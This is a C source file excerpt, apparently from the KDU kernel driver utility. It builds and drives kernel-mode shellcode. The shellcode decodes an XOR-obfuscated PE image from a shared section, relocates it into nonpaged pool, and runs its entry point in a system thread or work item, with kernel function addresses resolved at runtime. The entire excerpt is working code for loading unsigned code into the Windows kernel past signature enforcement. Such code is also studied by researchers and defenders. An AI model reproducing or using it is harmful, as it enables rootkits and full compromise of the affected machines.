                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }


                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Allocate worker and run image entry point within system worker thread.
                    //
                    WorkItem = (WORK_QUEUE_ITEM*)ShellCode->Import.ExAllocatePoolWithTag(NonPagedPool,
                        sizeof(WORK_QUEUE_ITEM),
                        ShellCode->Tag);

                    if (WorkItem) {

                        WorkItem->List.Flink = NULL;
                        WorkItem->Parameter = NULL;
                        WorkItem->WorkerRoutine = (PWORKER_THREAD_ROUTINE)(exbuffer + popth->AddressOfEntryPoint);

                        PayloadHeader->ExQueueWorkItem(WorkItem, DelayedWorkQueue);

                        //
                        // Save result.
                        //
                        PayloadHeader->IoStatus.Information = (ULONG_PTR)WorkItem;
                        PayloadHeader->IoStatus.Status = STATUS_SUCCESS;
                    }


                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* ScDispatchRoutineV1
*
* Purpose:
*
* Bootstrap shellcode variant 1.
* Read image from shared section, process relocs and run it in allocated system thread.
*
* IRQL: PASSIVE_LEVEL
*
*/
NTSTATUS NTAPI ScDispatchRoutineV1(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PSHELLCODE ShellCode)
{
    NTSTATUS                        status;
    ULONG                           isz;
    HANDLE                          hThread;
    OBJECT_ATTRIBUTES               obja;
    ULONG_PTR                       img, exbuffer;

    PIO_STACK_LOCATION              StackLocation;

    PIMAGE_DOS_HEADER               dosh;
    PIMAGE_FILE_HEADER              fileh;
    PIMAGE_OPTIONAL_HEADER          popth;
    PIMAGE_BASE_RELOCATION          rel;

    DWORD_PTR                       delta;
    LPWORD                          chain;
    DWORD                           c, rsz, k, off;

    PUCHAR                          ptr;

    PKEVENT                         ReadyEvent;
    PVOID                           SectionRef, pvSharedSection = NULL, rawExAlloc;
    SIZE_T                          ViewSize;

    POBJECT_TYPE*                   ppSecType;
    PPAYLOAD_HEADER_V1              PayloadHeader;

#ifdef ENABLE_DBGPRINT
    CHAR                            szFormat1[] = { 'S', '%', 'l', 'x', 0 };
    CHAR                            szFormat2[] = { 'F', '%', 'l', 'x', 0 };
#endif

#ifdef _DEBUG
    StackLocation = IoGetCurrentIrpStackLocationTest(Irp);
#else
    StackLocation = IoGetCurrentIrpStackLocation(Irp);
#endif

    if ((StackLocation->MajorFunction == IRP_MJ_CREATE)
        && (DeviceObject->SectorSize == 0))
    {
        ppSecType = (POBJECT_TYPE*)ShellCode->MmSectionObjectType;

        status = ShellCode->Import.ObReferenceObjectByHandle(
            ShellCode->SectionHandle,
            SECTION_ALL_ACCESS,
            (ppSecType ? *ppSecType : NULL),
            0,
            (PVOID*)&SectionRef,
            NULL);

        if (NT_SUCCESS(status)) {

            ViewSize = ShellCode->SectionViewSize;

            status = ShellCode->Import.ZwMapViewOfSection(ShellCode->SectionHandle,
                NtCurrentProcess(),
                (PVOID*)&pvSharedSection,
                0,
                PAGE_SIZE,
                NULL,
                &ViewSize,
                ViewUnmap,
                0,
                PAGE_READWRITE);

            if (NT_SUCCESS(status)) {

                k = ShellCode->Tag;

                PayloadHeader = (PAYLOAD_HEADER_V1*)pvSharedSection;
                rsz = PayloadHeader->ImageSize;
                ptr = (PUCHAR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);

                while (rsz--) {
                    *ptr ^= k;
                    k = _rotl(k, 1);
                    ptr++;
                }

                img = (ULONG_PTR)pvSharedSection + sizeof(PAYLOAD_HEADER_V1);
                dosh = (PIMAGE_DOS_HEADER)img;
                fileh = (PIMAGE_FILE_HEADER)(img + sizeof(DWORD) + dosh->e_lfanew);
                popth = (PIMAGE_OPTIONAL_HEADER)((PBYTE)fileh + sizeof(IMAGE_FILE_HEADER));
                isz = popth->SizeOfImage;

                //
                // Allocate memory for mapped image.
                //
                rawExAlloc = ShellCode->Import.ExAllocatePoolWithTag(
                    NonPagedPool,
                    isz + PAGE_SIZE,
                    ShellCode->Tag);

                if (rawExAlloc) {

                    exbuffer = ((ULONG_PTR)rawExAlloc + (PAGE_SIZE - 1)) & ~(PAGE_SIZE - 1);
                    delta = exbuffer - popth->ImageBase;

                    //
                    // Relocate image.
                    //
                    if (popth->NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_BASERELOC) {
                        off = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
                        rsz = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
                        if (off && rsz && off + rsz <= isz) {
                            rel = (PIMAGE_BASE_RELOCATION)(img + off);
                            c = 0;
                            while (c < rsz) {
                                chain = (LPWORD)((PUCHAR)rel + sizeof(IMAGE_BASE_RELOCATION));
                                for (off = sizeof(IMAGE_BASE_RELOCATION); off < rel->SizeOfBlock; off += sizeof(WORD), chain++) {
                                    if ((*chain >> 12) == IMAGE_REL_BASED_DIR64)
                                        *(PULONG_PTR)(img + rel->VirtualAddress + (*chain & 0x0FFF)) += delta;
                                }
                                c += rel->SizeOfBlock;
                                rel = (PIMAGE_BASE_RELOCATION)((PUCHAR)rel + rel->SizeOfBlock);
                            }
                        }
                    }

                    //
                    // Copy image to allocated buffer. We can't use any fancy memcpy stuff here.
                    //
                    __movsb((PUCHAR)exbuffer, (const UCHAR*)img, isz);

                    //
                    // Create system thread with handler set to image entry point.
                    //
                    hThread = NULL;
                    InitializeObjectAttributes(&obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

                    status = PayloadHeader->PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &obja, NULL, NULL,
                        (PKSTART_ROUTINE)(exbuffer + popth->AddressOfEntryPoint), NULL);

                    if (NT_SUCCESS(status))
                        PayloadHeader->ZwClose(hThread);

                    //
                    // Save result.
                    //
                    PayloadHeader->IoStatus.Status = status;

                    //
                    // Block further IRP_MJ_CREATE requests.
                    //
                    DeviceObject->SectorSize = 512;

                } //ExAllocatePoolWithTag(rawExAlloc)

                ShellCode->Import.ZwUnmapViewOfSection(NtCurrentProcess(),
                    pvSharedSection);

            } //ZwMapViewOfSection(pvSharedSection)

            ShellCode->Import.ObfDereferenceObject(SectionRef);

            //
            // Fire the event to let userland know that we're ready.
            //
            status = ShellCode->Import.ObReferenceObjectByHandle(ShellCode->ReadyEventHandle,
                SYNCHRONIZE | EVENT_MODIFY_STATE, NULL, 0, (PVOID*)&ReadyEvent, NULL);
            if (NT_SUCCESS(status))
            {
                ShellCode->Import.KeSetEvent(ReadyEvent, 0, FALSE);
                ShellCode->Import.ObfDereferenceObject(ReadyEvent);
            }

        } // ObReferenceObjectByHandle success

    }
    ShellCode->Import.IofCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

//
// In case if MSVC trashes shellcode and you turned off optimization re-enable it here #pragma optimize("", on )
//
typedef NTSTATUS(NTAPI* pfnScDispatchRoutine)(
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp,
    _In_ PVOID ShellCode);

typedef VOID(NTAPI* pfnScLoaderRoutine)(
    _In_ PVOID ShellCode);

/*
* ScDispatchRoutineDebugSelector
*
* Purpose:
*
* Run shellcode according to version during debug.
*
*/
NTSTATUS NTAPI ScDispatchRoutineDebugSelector(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer,
    _In_ struct _DEVICE_OBJECT* DeviceObject,
    _Inout_ struct _IRP* Irp)
{
    union {
        pfnScDispatchRoutine DispatchRoutine;
        pfnScLoaderRoutine LoaderRoutine;
    } Routine;

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
        Routine.LoaderRoutine = (pfnScLoaderRoutine)ScLoaderRoutineV1;
        break;
    case KDU_SHELLCODE_V3:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV3;
        break;
    case KDU_SHELLCODE_V2:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV2;
        break;
    case KDU_SHELLCODE_V1:
    default:
        Routine.DispatchRoutine = (pfnScDispatchRoutine)ScDispatchRoutineV1;
        break;
    }

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
        Routine.LoaderRoutine(ScBuffer);
        return STATUS_SUCCESS;
    default:
        return Routine.DispatchRoutine(DeviceObject, Irp, ScBuffer);
    }
}

/*
* ScSizeOfProc
*
* Purpose:
*
* Very simplified. Return size of procedure when first ret meet.
*
*/
ULONG ScSizeOfProc(
    _In_ PBYTE FunctionPtr)
{
    ULONG   c = 0;
    UCHAR* p;
    hde64s  hs;

    __try {

        do {
            p = FunctionPtr + c;
            hde64_disasm(p, &hs);
            if (hs.flags & F_ERROR)
                break;
            c += hs.len;

        } while (*p != 0xC3);

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return 0;
    }
    return c;
}

/*
* ScResolveFunctionByName
*
* Purpose:
*
* Get function address by it name.
*
*/
ULONG_PTR ScResolveFunctionByName(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR Function)
{
    ULONG_PTR Address = supGetProcAddress(KernelBase, KernelImage, Function);
    if (Address == 0) {
        
        supPrintfEvent(kduEventError, 
            "[!] Error, %s address cannot be found\r\n", Function);
        
        return 0;
    }

    printf_s("[*] %s 0x%llX\r\n", Function, Address);
    return Address;
}

/*
* ScGetViewSize
*
* Purpose:
*
* Return payload section view size.
*
*/
SIZE_T ScGetViewSize(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    SIZE_T viewSize;
    PSHELLCODE pvShellCode = (PSHELLCODE)ScBuffer;

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        viewSize = pvShellCode->SectionViewSize;
        break;
    }

    return viewSize;
}

/*
* ScSizeOf
*
* Purpose:
*
* Return shellcode/payload header size depending on shellcode version.
*
*/
DWORD ScSizeOf(
    _In_ ULONG ScVersion,
    _Out_opt_ PULONG PayloadSize
)
{
    ULONG payloadSize;

    if (PayloadSize) {
        switch (ScVersion) {
        case KDU_SHELLCODE_V3:
            payloadSize = sizeof(PAYLOAD_HEADER_V3);
            break;
        case KDU_SHELLCODE_V2:
            payloadSize = sizeof(PAYLOAD_HEADER_V2);
            break;
        case KDU_SHELLCODE_V4:
        case KDU_SHELLCODE_V1:
        default:
            payloadSize = sizeof(PAYLOAD_HEADER_V1);
            break;
        }
        *PayloadSize = payloadSize;
    }

    return sizeof(SHELLCODE);
}

/*
* ScBuildShellImportDebug
*
* Purpose:
*
* Retrieve pointers for shellcode version independent part for Debug mode.
*
*/
BOOL ScBuildShellImportDebug(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

    switch (ScVersion) {

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
#ifdef ENABLE_DBGPRINT
        ShellCode->Import.DbgPrint = DbgPrintTest;
#endif
        ShellCode->Import.ExAllocatePoolWithTag = &ExAllocatePoolWithTagTest;
        ShellCode->Import.ZwMapViewOfSection = &NtMapViewOfSection;
        ShellCode->Import.ZwUnmapViewOfSection = &NtUnmapViewOfSection;
        ShellCode->Import.IofCompleteRequest = &IofCompleteRequestTest;
        ShellCode->Import.KeSetEvent = &KeSetEventTest;
        ShellCode->Import.ObReferenceObjectByHandle = &ObReferenceObjectByHandleTest;
        ShellCode->Import.ObfDereferenceObject = &ObfDereferenceObjectTest;
        g_DummyULONG64 = 0;
        ShellCode->MmSectionObjectType = &g_DummyULONG64;
        break;
    }

    return TRUE;
}

/*
* ScBuildShellImport
*
* Purpose:
*
* Retrieve pointers for shellcode version independent part.
*
*/
BOOL ScBuildShellImport(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer,
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage
)
{
    BOOL bResolved = FALSE;

    ULONG i;

    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

#ifdef ENABLE_DBGPRINT
    pfnDbgPrint DbgPrintPtr;
#endif

    PVOID MmSectionObjectTypePtr;

    PVOID funcPtrs[MAX_BASE_SCIMPORTS_NODBGPRINT];
    LPCSTR funcNames[MAX_BASE_SCIMPORTS_NODBGPRINT] = {
        "ExAllocatePoolWithTag",
        "IofCompleteRequest",
        "ZwMapViewOfSection",
        "ZwUnmapViewOfSection",
        "ObReferenceObjectByHandle",
        "ObfDereferenceObject",
        "KeSetEvent"
    };

    UNREFERENCED_PARAMETER(ScVersion);

    do {

#ifndef ENABLE_DBGPRINT
#pragma warning(push)
#pragma warning(disable: 4127)
        if (sizeof(ShellCode->Import) != sizeof(funcPtrs))
            break;
#pragma warning(pop)
#endif

        MmSectionObjectTypePtr =
            (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, "MmSectionObjectType");
        ASSERT_RESOLVED_FUNC(MmSectionObjectTypePtr);

        ShellCode->MmSectionObjectType = MmSectionObjectTypePtr;

#ifdef ENABLE_DBGPRINT
        DbgPrintPtr =
            (pfnDbgPrint)ScResolveFunctionByName(KernelBase, KernelImage, "DbgPrint");
        ASSERT_RESOLVED_FUNC(DbgPrintPtr);

        ShellCode->Import.DbgPrint = DbgPrintPtr;
#endif

        for (i = 0; i < RTL_NUMBER_OF(funcNames); i++) {
            funcPtrs[i] = (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, funcNames[i]);
            ASSERT_RESOLVED_FUNC(funcPtrs[i]);
        }

#ifdef ENABLE_DBGPRINT

        PUCHAR funcPtr = (PUCHAR)&ShellCode->Import + sizeof(PVOID);
        RtlCopyMemory(funcPtr, funcPtrs, sizeof(funcPtrs));

#else
        RtlCopyMemory(&ShellCode->Import, funcPtrs, sizeof(funcPtrs));
#endif
        bResolved = TRUE;

    } while (FALSE);

    return bResolved;
}

/*
* ScCreateReadyEvent
*
* Purpose:
*
* Create synchronization event and store value it in shellcode.
*
*/
HANDLE ScCreateReadyEvent(
    _In_ ULONG ScVersion,
    _In_ PVOID ScBuffer
)
{
    HANDLE hReadyEvent;
    SHELLCODE* ShellCode = (SHELLCODE*)ScBuffer;

    hReadyEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    switch (ScVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        ShellCode->ReadyEventHandle = hReadyEvent;
        break;
    }

    return hReadyEvent;
}

/*
* ScStoreVersionSpecificData
*
* Purpose:
*
* Store version specific data in the shared section part.
*
*/
BOOLEAN ScStoreVersionSpecificData(
    _In_ PKDU_CONTEXT Context,
    _In_ PVOID PayloadPtr
)
{
    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    FIXED_UNICODE_STRING regPath, drvName;
    LPWSTR lpRegistryEntryName;

    pvPayloadHead.Ref = PayloadPtr;

    switch (Context->ShellVersion) {
    case KDU_SHELLCODE_V3:

        //
        // Build driver name and registry path for shellcode.
        //

        if (Context->DriverObjectName.Length == 0)
            return FALSE;

        //
        // Build driver name in ObManager format.
        //

        RtlSecureZeroMemory(&drvName, sizeof(drvName));

        StringCchPrintf(drvName.Buffer, MAX_PATH,
            L"%ws%ws",
            OB_DRIVER_PREFIX,
            Context->DriverObjectName.Buffer);

        drvName.Length = (USHORT)(_strlen(drvName.Buffer) * sizeof(WCHAR));
        drvName.MaximumLength = drvName.Length + sizeof(WCHAR);
        drvName.Buffer[drvName.Length / sizeof(WCHAR)] = UNICODE_NULL;

        RtlCopyMemory(&pvPayloadHead.Version.v3->ObjectName,
            &drvName,
            sizeof(FIXED_UNICODE_STRING));

        if (Context->DriverRegistryPath.Length == 0) {

            //
            // Registry name not provided, assume it is the same as driver object name.
            //

            lpRegistryEntryName = Context->DriverObjectName.Buffer;

        }
        else {

            lpRegistryEntryName = Context->DriverRegistryPath.Buffer;

        }

        StringCchPrintf(regPath.Buffer, MAX_PATH,
            L"\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%ws",
            lpRegistryEntryName);

        regPath.Length = (USHORT)(_strlen(regPath.Buffer) * sizeof(WCHAR));
        regPath.MaximumLength = regPath.Length + sizeof(WCHAR);
        regPath.Buffer[regPath.Length / sizeof(WCHAR)] = UNICODE_NULL;

        RtlCopyMemory(&pvPayloadHead.Version.v3->RegistryPath,
            &regPath,
            sizeof(FIXED_UNICODE_STRING));

        break;

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
        //
        // Nothing.
        //
    default:
        break;
    }

    return TRUE;
}

/*
* ScFree
*
* Purpose:
*
* Release shellcode buffer memory.
*
*/
VOID ScFree(
    _In_ PVOID ScBuffer,
    _In_ ULONG ScSize
)
{
    supFreeLockedMemory(ScBuffer, ScSize);
}

/*
* ScBuildInitCodeForVersion
*
* Purpose:
*
* Store init code for shellcode version specific.
*
*/
BOOL ScBuildInitCodeForVersion(
    _In_ ULONG ShellVersion,
    _In_ PSHELLCODE pvShellCode
)
{
    PVOID pvInitCode;
    ULONG initSize = 0;

    //
    // Fill entire init code with int 3
    //
    RtlFillMemory(pvShellCode->InitCode, sizeof(pvShellCode->InitCode), 0xCC);

    //
    // Select and copy code.
    //
    pvInitCode = ScGetBootstrapLdr(ShellVersion, &initSize);
    if (initSize > sizeof(pvShellCode->InitCode)) {
        return FALSE;
    }

    RtlCopyMemory(pvShellCode->InitCode, pvInitCode, initSize);

    return TRUE;
}

/*
* ScAllocate
*
* Purpose:
*
* Allocate main shellcode buffer in memory, setup init code and import which is not version specific.
*
*/
PVOID ScAllocate(
    _In_ ULONG ShellVersion,
    _In_ HANDLE SectionHandle,
    _In_ SIZE_T SectionViewSize,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG MemoryTag,
    _Out_ PULONG ShellSize
)
{
    DWORD scSize;
    PSHELLCODE pvShellCode = NULL;
    PVOID pvBootstrap;

    PBYTE procPtr = NULL;

    ULONG procSize, bootstrapSize;

    *ShellSize = 0;

    bootstrapSize = BOOTSTRAPCODE_SIZE_V1;
    scSize = ScSizeOf(ShellVersion, NULL);

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
        procPtr = (PBYTE)ScLoaderRoutineV1;
        break;
    case KDU_SHELLCODE_V3:
        procPtr = (PBYTE)ScDispatchRoutineV3;
        break;
    case KDU_SHELLCODE_V2:
        procPtr = (PBYTE)ScDispatchRoutineV2;
        break;
    case KDU_SHELLCODE_V1:
    default:
        procPtr = (PBYTE)ScDispatchRoutineV1;
        break;
    }

    procSize = ScSizeOfProc(procPtr);
    if (procSize > bootstrapSize) {

        supPrintfEvent(kduEventError, 
            "[!] Bootstrap code size 0x%lX exceeds limit 0x%lX, abort\r\n", 
            procSize, 
            bootstrapSize);

#ifndef _DEBUG
        return NULL;
#endif
    }

    pvShellCode = (SHELLCODE*)supAllocateLockedMemory(scSize,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);

    if (pvShellCode == NULL)
        return NULL;

    pvBootstrap = pvShellCode->BootstrapCode;

    switch (ShellVersion) {
    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V3:
    case KDU_SHELLCODE_V2:
    case KDU_SHELLCODE_V1:
    default:
        pvShellCode->Tag = MemoryTag;
        pvShellCode->SectionHandle = SectionHandle;
        pvShellCode->SectionViewSize = SectionViewSize;
        break;
    }

    //
    // Build initial loader code part.
    //
    if (!ScBuildInitCodeForVersion(ShellVersion, pvShellCode)) {
        ScFree(pvShellCode, scSize);
        return NULL;
    }

#ifdef _DEBUG

    UNREFERENCED_PARAMETER(KernelBase);
    UNREFERENCED_PARAMETER(KernelImage);

    //
    // Remember function pointers.
    //
    ScBuildShellImportDebug(ShellVersion, pvShellCode);

    //
    // Shellcode test, unused in Release build.
    //

    DEVICE_OBJECT devObject;
    DRIVER_OBJECT drvObject;
    IRP tempIrp;

    RtlSecureZeroMemory(&tempIrp, sizeof(tempIrp));
    RtlSecureZeroMemory(&devObject, sizeof(devObject));
    RtlSecureZeroMemory(&drvObject, sizeof(DRIVER_OBJECT));

    devObject.SectorSize = 0;
    devObject.DriverObject = &drvObject;
    drvObject.MajorFunction[IRP_MJ_PNP] = (PVOID)0x0BADBEFF1CEDC01A;

    ScDispatchRoutineDebugSelector(ShellVersion, pvShellCode, &devObject, &tempIrp);

#else

    printf_s("[+] Resolving base shellcode import\r\n");

    if (!ScBuildShellImport(ShellVersion,
        pvShellCode,
        KernelBase,
        KernelImage))
    {
        ScFree(pvShellCode, scSize);
        
        supPrintfEvent(kduEventError, 
            "[!] Failed to resolve base shellcode import\r\n");
        
        return NULL;
    }

    __try {
        RtlCopyMemory(pvBootstrap, procPtr, procSize);
        //supWriteBufferToFile((PWSTR)L"C:\\install\\out2.bin", pvBootstrap, procSize, FALSE, FALSE, NULL);
        ////((void(*)())ShellCode.Version.v1->InitCode)();

    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        
        supPrintfEvent(kduEventError, 
            "[!] Exception during building shellcode, 0x%lX\r\n", 
            GetExceptionCode());
        
        return NULL;
    }

    *ShellSize = procSize;

#endif

    return pvShellCode;
}

/*
* ScCreateFixedUnicodeString
*
* Purpose:
*
* Create UNICODE_STRING with fixed maximum (FIXED_UNICODE_STRING_LENGTH) size buffer.
*
*/
BOOLEAN ScCreateFixedUnicodeString(
    _Inout_ PFIXED_UNICODE_STRING DestinationString,
    _In_ PCWSTR SourceString
)
{
    ULONG cb;

    cb = sizeof(UNICODE_NULL) + ((ULONG)_strlen(SourceString) * sizeof(WCHAR));
    if (cb > FIXED_UNICODE_STRING_LENGTH * sizeof(WCHAR)) {
        return FALSE;
    }
    else {
        RtlCopyMemory(DestinationString->Buffer, SourceString, cb);
        DestinationString->Length = (USHORT)(cb - sizeof(UNICODE_NULL));
        DestinationString->MaximumLength = (USHORT)cb;
        return TRUE;
    }
}

/*
* ScResolveImportForPayload
*
* Purpose:
*
* Resolve ntoskrnl import specific for payload per version.
*
*/
BOOLEAN ScResolveImportForPayload(
    _In_ ULONG ShellVersion,
    _In_ PVOID PayloadHead,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    union {
        union {
            PAYLOAD_HEADER_V1* v1;
            PAYLOAD_HEADER_V2* v2;
            PAYLOAD_HEADER_V3* v3;
        } Version;
        PVOID Ref;
    } pvPayloadHead;

    pfnZwClose ZwClosePtr;
    pfnExQueueWorkItem ExQueueWorkItemPtr;
    pfnPsCreateSystemThread PsCreateSystemThreadPtr;

    PVOID IoDriverObjectTypePtr;
    pfnObCreateObject ObCreateObjectPtr;
    pfnObInsertObject ObInsertObjectPtr;
    pfnObMakeTemporaryObject ObMakeTemporaryObjectPtr;
    pfnZwMakeTemporaryObject ZwMakeTemporaryObjectPtr;

#ifdef _DEBUG
    UNREFERENCED_PARAMETER(KernelBase);
    UNREFERENCED_PARAMETER(KernelImage);
#endif

    pvPayloadHead.Ref = PayloadHead;

    switch (ShellVersion) {

    case KDU_SHELLCODE_V3:

#ifdef _DEBUG
        g_DummyULONG64 = 0;
        IoDriverObjectTypePtr = &g_DummyULONG64;
        ObCreateObjectPtr = ObCreateObjectTest;
        ObInsertObjectPtr = ObInsertObjectTest;
        ObMakeTemporaryObjectPtr = ObMakeTemporaryObjectTest;
        ZwMakeTemporaryObjectPtr = ZwMakeTemporaryObjectTest;
        ZwClosePtr = ZwCloseTest;
#else
        IoDriverObjectTypePtr =
            (PVOID)ScResolveFunctionByName(KernelBase, KernelImage, "IoDriverObjectType");
        ASSERT_RESOLVED_FUNC_ABORT(IoDriverObjectTypePtr);

        ObCreateObjectPtr =
            (pfnObCreateObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObCreateObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObCreateObjectPtr);

        ObInsertObjectPtr =
            (pfnObInsertObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObInsertObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObInsertObjectPtr);

        ObMakeTemporaryObjectPtr =
            (pfnObMakeTemporaryObject)ScResolveFunctionByName(KernelBase, KernelImage, "ObMakeTemporaryObject");
        ASSERT_RESOLVED_FUNC_ABORT(ObMakeTemporaryObjectPtr);

        ZwMakeTemporaryObjectPtr =
            (pfnZwMakeTemporaryObject)ScResolveFunctionByName(KernelBase, KernelImage, "ZwMakeTemporaryObject");
        ASSERT_RESOLVED_FUNC_ABORT(ZwMakeTemporaryObjectPtr);

        ZwClosePtr =
            (pfnZwClose)ScResolveFunctionByName(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC_ABORT(ZwClosePtr);
#endif

        pvPayloadHead.Version.v3->IoDriverObjectType = IoDriverObjectTypePtr;
        pvPayloadHead.Version.v3->ObCreateObject = ObCreateObjectPtr;
        pvPayloadHead.Version.v3->ObInsertObject = ObInsertObjectPtr;
        pvPayloadHead.Version.v3->ObMakeTemporaryObject = ObMakeTemporaryObjectPtr;
        pvPayloadHead.Version.v3->ZwMakeTemporaryObject = ZwMakeTemporaryObjectPtr;
        pvPayloadHead.Version.v3->ZwClose = ZwClosePtr;

        break;

    case KDU_SHELLCODE_V2:

#ifdef _DEBUG
        ExQueueWorkItemPtr = ExQueueWorkItemTest;
#else
        ExQueueWorkItemPtr =
            (pfnExQueueWorkItem)ScResolveFunctionByName(KernelBase, KernelImage, "ExQueueWorkItem");
        ASSERT_RESOLVED_FUNC_ABORT(ExQueueWorkItemPtr);
#endif
        pvPayloadHead.Version.v2->ExQueueWorkItem = ExQueueWorkItemPtr;

        break;

    case KDU_SHELLCODE_V4:
    case KDU_SHELLCODE_V1:
    default:

#ifdef _DEBUG
        ZwClosePtr = ZwCloseTest;
        PsCreateSystemThreadPtr = PsCreateSystemThreadTest;
#else
        ZwClosePtr =
            (pfnZwClose)ScResolveFunctionByName(KernelBase, KernelImage, "ZwClose");
        ASSERT_RESOLVED_FUNC_ABORT(ZwClosePtr);

        PsCreateSystemThreadPtr =
            (pfnPsCreateSystemThread)ScResolveFunctionByName(KernelBase, KernelImage, "PsCreateSystemThread");
        ASSERT_RESOLVED_FUNC_ABORT(PsCreateSystemThreadPtr);
#endif

        pvPayloadHead.Version.v1->PsCreateSystemThread = PsCreateSystemThreadPtr;
        pvPayloadHead.Version.v1->ZwClose = ZwClosePtr;
        break;
    }

    return TRUE;
}
